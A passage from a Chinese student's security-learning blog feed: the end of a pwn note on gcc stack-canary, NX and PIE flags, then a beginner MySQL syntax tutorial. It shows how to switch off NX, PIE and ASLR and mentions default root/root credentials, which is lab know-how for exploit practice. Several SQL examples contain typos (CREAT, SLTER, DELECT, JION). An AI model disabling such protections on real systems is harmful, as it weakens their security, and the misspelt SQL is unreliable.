title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护<br>gcc -fstack-protector-all 启用保护，为所有函数插入保护<br>gcc -fstack-protector-strong<br>gcc -fstack-protector-explicit 只对有明确stack_protect attribute 的函数开启保护<br>gcc -fno-stack-protector 禁用保护<br></code></pre></td></tr></table></figure><h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX(DEP)"></a>NX(DEP)</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>NX 即 No-eXecute（不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h4 id="参数设置-2"><a href="#参数设置-2" class="headerlink" title="参数设置"></a>参数设置</h4><p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 - z execstack 参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c                    // 默认情况下，开启NX保护<br>gcc -z execstack -o test test.c        // 禁用NX保护<br>gcc -z noexecstack -o test test.c    // 开启NX保护<br></code></pre></td></tr></table></figure><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><h4 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h4><p>PIE即Position-Independent Executable（ 位置无关可执行文件），与ASLR 技术类似。</p><p>ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关，即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。</p><p>这就意味着，在 PIE 和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，传统的改写GOT 表项的方法也难以进行，因为攻击者不能获得程序的.got 段的虚地址。</p><p>liunx 下关闭 PIE 的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h4 id="参数设置-3"><a href="#参数设置-3" class="headerlink" title="参数设置"></a>参数设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcc">gcc -o test test.c       // 默认情况下，不开启PIE<br>gcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1<br>gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2<br>gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIE<br>gcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE<br></code></pre></td></tr></table></figure><hr><p>杂七杂八忙了一个周，抽时间学了这么点东西。我是菜鸡🥬</p><p>有看几道pwn题，发现大部分题目都是需要一些逆向技巧的，有些还会和web结合 <del>非常疯狂</del></p><p>如果有空web一些基础的东西我还是会继续学的，就熬夜吧熬夜吧🤪</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ubuntu</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL数据库基础</title>
    <link href="/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>又名：学了就忘只能再看从头重学😣</p><span id="more"></span><h1 id="01-phpstudy中MySQL的简单使用"><a href="#01-phpstudy中MySQL的简单使用" class="headerlink" title="01 phpstudy中MySQL的简单使用"></a>01 phpstudy中MySQL的简单使用</h1><p>在学用MySQL的时候发现自己和学习资料用的不是同一个集成环境，所以打开方式不一样，这种小问题还是难不倒我哒😎</p><p>首先开启MySQL服务    <del>好了接下来就不会了</del></p><p>再去小皮官网看看</p><p>有一个模块是phpMyAdmin的使用。按照官方教程下载好打开我才发现这是在网页上操作，不是命令行。没关系，下载都下载了，学习一下。</p><h4 id="001-图形化界面操作"><a href="#001-图形化界面操作" class="headerlink" title="001 图形化界面操作"></a>001 图形化界面操作</h4><p>在软件管理找到<strong>phpMyAdmin</strong>，点击下载。下载完之后点管理就会自动在浏览器打开，输入用户名和密码就可以使用啦。</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-29-51.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong></p><p>在phpMyAdmin也可以用SQL查询语句嗷</p><blockquote><p>输入SELECT id FROM test ;</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-48-13.png"></p><p>使用其他界面操作内容时也可以预览SQL语句</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-51-03.png"></p><p>总之就是很简单易上手辣😇</p><p><del>连我都可以无师自通</del></p><h4 id="002-cmd操作"><a href="#002-cmd操作" class="headerlink" title="002 cmd操作"></a>002 cmd操作</h4><blockquote><p>MySQL在phpstudy_pro文件下的Extensions文件夹里</p></blockquote><p>进入bin目录后在此处打开cmd</p><p>输入<code>mysql -u[用户名] -p[密码] -h [数据库服务器地址]</code>进入</p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong>，打开本地数据库可以不加服务器地址</p><p>进入mysql之后就可以快乐使用了</p><h1 id="02-关于MySQL"><a href="#02-关于MySQL" class="headerlink" title="02 关于MySQL"></a>02 关于MySQL</h1><h4 id="001-MySQL常见符号"><a href="#001-MySQL常见符号" class="headerlink" title="001 MySQL常见符号"></a>001 MySQL常见符号</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>表示当前命令没有命令执行符或者等待命令执行符<code>;</code>或<code>\g</code>，也可以输入<code>\c</code>取消命令直接输入<code>;</code>回车即可执行命令。</p><h5 id="‘-gt-或”-gt"><a href="#‘-gt-或”-gt" class="headerlink" title="‘&gt;或”&gt;"></a>‘&gt;或”&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>表示当前命令缺少<code>&#39;</code>或<code>&quot;</code></p><h4 id="002-MySQL编码规范"><a href="#002-MySQL编码规范" class="headerlink" title="002 MySQL编码规范"></a>002 MySQL编码规范</h4><ul><li><p>关键字与函数名称全部大写；（不大写也可以执行命令）</p></li><li><p>数据库名称、表名、字段名称全部小写；</p></li><li><p>必须以分号结尾</p></li></ul><h4 id="003-结构化查询语言"><a href="#003-结构化查询语言" class="headerlink" title="003 结构化查询语言"></a>003 结构化查询语言</h4><p>主要分为四类</p><p>DDL-数据库定义语言（CREATE DROP ALTER)</p><p>DML-数据库操作语言（INSERT DELETE UPDATE)</p><p>DQL-数据库查询语言（SELECT WHERE)</p><p>DCL-数据库控制语言</p><p><del>说了这么多也没什么用</del>🤪</p><h1 id="03-SQL语法"><a href="#03-SQL语法" class="headerlink" title="03 SQL语法"></a>03 SQL语法</h1><h3 id="对库的操作"><a href="#对库的操作" class="headerlink" title="对库的操作"></a>对库的操作</h3><h5 id="查找库"><a href="#查找库" class="headerlink" title="查找库"></a>查找库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>不知道即将创建的库是否存在时，可使用以下命令：如果库不存在就创建，存在则退出命令</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>但不建议让MySQL来做判断</p></blockquote><h5 id="删除库"><a href="#删除库" class="headerlink" title="删除库"></a>删除库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>数据库不能修改名字</strong></p><h3 id="对表的操作"><a href="#对表的操作" class="headerlink" title="对表的操作"></a>对表的操作</h3><h5 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //查找当前库的所有表<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [数据类型] [列的完整性约束]，<br>    ······<br>);<br></code></pre></td></tr></table></figure><blockquote><p>name为创建的表格名，可自行更改</p><p>空格里填表格表头及数据信息</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>创建新表后，可以使用<code>desc table_name</code>查询表格信息</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>数据类型</p><table><thead><tr><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>Int</td><td>整数类型</td></tr><tr><td>char(n)</td><td>字符&#x2F;字符串，固定长度</td></tr><tr><td>varchar(n)</td><td>字符&#x2F;字符串，可变长度，最大长度为n</td></tr><tr><td>numeric(a,b)</td><td>精确数值，总位数为a，精确到小数点后第b位</td></tr><tr><td>date</td><td>时间，存储年月日的值</td></tr></tbody></table><p>字段约束</p><table><thead><tr><th>约束类型</th><th>说明</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>只能用于数值整型，设置无符号。最大值不能超过255</td></tr><tr><td>ZEROFILL</td><td>只能用于数值整形，自动用0补全不足位数。eg：001</td></tr><tr><td>AUTO_INCREMENT</td><td>设置字段的自动增量属性，只能用于设置数值类型。</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>默认为NULL，即没有在此字段插入值。如果设置NOT NULL，则必须在此字段插入相应的值。</td></tr><tr><td>DEFAULT</td><td>通过此属性设置默认值</td></tr><tr><td>PRIMARY KEY</td><td>主键约束，主键自动为NOT NULL。</td></tr></tbody></table><blockquote><p>AUTO_INCREMENT必须和PRIMARY KEY一起用。自动增量必须为主键，但主键不一定要自动增量。</p></blockquote><h5 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="对字段的操作"><a href="#对字段的操作" class="headerlink" title="对字段的操作"></a>对字段的操作</h3><h5 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [数据类型] [完整性约束] [位置参数];<br></code></pre></td></tr></table></figure><blockquote><p>位置参数可空默认加在表的最后，也可使用FIRST或AFTER[字段名]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [改后数据类型] [改后的完整性约束]；<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [改后数据类型] [改后的完整性约束]；<br></code></pre></td></tr></table></figure><blockquote><p>MODIFY关键字只能改数据类型和完整性约束</p></blockquote><h5 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]，DROP [column_name2]，······；<br></code></pre></td></tr></table></figure><h3 id="对内容的操作"><a href="#对内容的操作" class="headerlink" title="对内容的操作"></a>对内容的操作</h3><h5 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，(&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，······；<br>//一次插入多条数据<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br></code></pre></td></tr></table></figure><blockquote><p>第二种方法必须严格按照表中顺序一一填写，自增字段可用null占位但不能为空</p></blockquote><p>我的电脑输入字段名不能加引号不然会报错<del>就离谱</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h5><ul><li>选择某一行或某一列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>选择整个表格</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="删除字段-1"><a href="#删除字段-1" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [删除条件]; <br></code></pre></td></tr></table></figure><blockquote><p>删除可使用where条件。条件可空，为空时全部值被影响。</p></blockquote><h5 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [修改条件];<br></code></pre></td></tr></table></figure><blockquote><p>修改条件可空，全部值被影响。</p></blockquote><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>去除重复值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>where语句用于在表中选择指定符合条件的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE 条件（字段名+运算符+数值）;<br></code></pre></td></tr></table></figure><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>加</td></tr><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>&#x2F;或DIV</td><td>除</td></tr><tr><td>%或MOD</td><td>取余</td></tr></tbody></table><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;或！&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>between</td><td>在某个范围内</td></tr><tr><td>like</td><td>模糊匹配</td></tr></tbody></table><blockquote><p>可以使用and或or连接多个条件</p></blockquote><p> <strong>like符号举例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[查询内容]%&#x27;      //表示以[查询内容]开头的数据<br>like &#x27;%[查询内容]&#x27;      //表示以[查询内容]结尾的数据<br>like &#x27;%[查询内容]%&#x27;      //表示只要查询内容出现即可<br>like &#x27;_[查询内容]%&#x27;      //表示查询内容前有一位字符，后有任意字符<br>like &#x27;%[查询内容]_&#x27;      //表示查询内容前有任意字符，后有一位字符<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>between用法</strong></p><p> between运算符包括起始值和结束值</p><p> 用于选取两个数值范围之内的值，可以是字符串，数字或者日期</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>NOT或！</td><td>逻辑非</td></tr><tr><td>AND</td><td>逻辑与</td></tr><tr><td>OR</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td></tr><tr><td>|</td><td>按位或</td></tr><tr><td>^</td><td>按位异或</td></tr><tr><td>!</td><td>取反</td></tr><tr><td>&lt;&lt;</td><td>左移</td></tr><tr><td>&gt;&gt;</td><td>右移</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>in实际上是多个or的合并</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subquery为子查询，用于嵌套在where子句中的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],···FROM [table_name] WHERE条件 (子查询)<br></code></pre></td></tr></table></figure><blockquote><p>子查询为一个完整的select语句</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>用as为查找对象起别名，但我没尝试成功🥲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [字段名] FROM [table_name] [条件语句] as [别名]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h5 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h5><p>count函数统计符合条件的记录数</p><p>统计表中的记录<strong>总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>不为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="max函数"><a href="#max函数" class="headerlink" title="max函数"></a>max函数</h5><p>max函数返回所选字段最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="min函数"><a href="#min函数" class="headerlink" title="min函数"></a>min函数</h5><p>min函数返回所选字段最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avg函数"><a href="#avg函数" class="headerlink" title="avg函数"></a>avg函数</h5><p>avg函数返回所选字段的平均值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sum函数"><a href="#sum函数" class="headerlink" title="sum函数"></a>sum函数</h5><p>sum函数返回所选按字段的合计值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="其他一些条件"><a href="#其他一些条件" class="headerlink" title="其他一些条件"></a>其他一些条件</h3><h5 id="having过滤分组"><a href="#having过滤分组" class="headerlink" title="having过滤分组"></a>having过滤分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having 统计函数 运算符 value；<br></code></pre></td></tr></table></figure><h5 id="group-by分组"><a href="#group-by分组" class="headerlink" title="group by分组"></a>group by分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h5><p>可分为正序asc和倒序desc两种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [排序方法],[column_name] [排序方法],······;   <br></code></pre></td></tr></table></figure><h5 id="限制查询数量"><a href="#限制查询数量" class="headerlink" title="限制查询数量"></a>限制查询数量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [查询数量]<br></code></pre></td></tr></table></figure><h4 id="多表联合"><a href="#多表联合" class="headerlink" title="多表联合"></a>多表联合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHERE子句<br></code></pre></td></tr></table></figure><h5 id="jion连接"><a href="#jion连接" class="headerlink" title="jion连接"></a>jion连接</h5><p>jion连接是基于多个表之间的共同字段把他们结合起来进行查询的一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] JION [table_name2] + ON 子句;<br></code></pre></td></tr></table></figure><h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><p>列出两个表中都存在的数据<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h5><p>即使没有匹配也要列出左表的数据<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h5><p>即使没有匹配也要列出右表的数据<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SQL语句格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECT语句] [WHERE条件] [GROUP BY条件] [HAVING条件] [ORDER BY条件] [LIMIT条件]；<br></code></pre></td></tr></table></figure><hr><p>终于把这SQL语句搞完了</p><p>撒花🎉</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP黑魔法</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
